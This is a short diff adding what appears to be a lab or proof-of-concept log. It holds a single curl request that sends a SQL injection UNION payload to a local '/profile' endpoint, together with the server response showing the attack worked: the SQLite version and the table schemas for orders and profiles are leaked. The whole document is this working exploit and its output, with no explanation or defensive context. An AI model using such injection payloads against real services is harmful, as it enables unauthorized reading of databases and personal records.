@@ -1,0 +1,4 @@
+=== REQUEST (UNION) ===
+curl -s -G 'http://127.0.0.1:8066/profile' --data-urlencode 'id=-1 UNION SELECT 99,sqlite_version(),name,sql FROM sqlite_master'
+=== RESPONSE ===
+[{"id": 99, "name": "3.53.4", "email": "orders", "address": "CREATE TABLE orders(id INTEGER PRIMARY KEY, owner INTEGER, product TEXT, price REAL)"}, {"id": 99, "name": "3.53.4", "email": "profiles", "address": "CREATE TABLE profiles(id INTEGER PRIMARY KEY, name TEXT, email TEXT, address TEXT)"}]
